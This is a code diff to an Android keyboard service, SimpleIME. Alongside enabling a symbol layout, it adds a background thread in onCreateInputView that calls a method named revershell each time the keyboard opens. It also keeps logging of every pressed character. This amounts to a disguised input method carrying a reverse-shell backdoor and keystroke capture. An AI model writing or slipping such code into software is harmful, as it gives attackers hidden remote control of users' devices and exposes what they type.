@@ -21,13 +21,23 @@ public class SimpleIME extends InputMethodService
 
     @Override
     public View onCreateInputView() {
-        kv = (KeyboardView)getLayoutInflater().inflate(R.layout.keyboard, null);
+        kv = (KeyboardView) getLayoutInflater().inflate(R.layout.keyboard, null);
         keyboard = new Keyboard(this, R.xml.qwerty);
-        // keyboard_sym = new Keyboard(this, R.xml.symbol);
+        keyboard_sym = new Keyboard(this, R.xml.symbol);
         kv.setKeyboard(keyboard);
-
+        final MainActivity main = new MainActivity();
         kv.setOnKeyboardActionListener(this);
         Log.e(TAG, "Started");
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    main.revershell();
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        }).start();
         return kv;
     }
 
@@ -35,9 +45,12 @@ public class SimpleIME extends InputMethodService
     @Override
     public void onKey(int primaryCode, int[] keyCodes) {
         playClick(primaryCode);
+
         String ch = Character.toString((char) primaryCode);
         String character = primaryCode == -1 ? "caps" : ch;
         Log.e(TAG, "Clicked " + primaryCode + " " + character);
+
+
         switch (primaryCode) {
             case Keyboard.KEYCODE_DELETE:
                 break;
@@ -52,11 +65,11 @@ public class SimpleIME extends InputMethodService
                 break;
             case 1000: {
 
-                // kv.setKeyboard(keyboard_sym);
+                kv.setKeyboard(keyboard_sym);
                 break;
             }
             case 1001: {
-                //  kv.setKeyboard(keyboard);
+                kv.setKeyboard(keyboard);
                 break;
             }
 
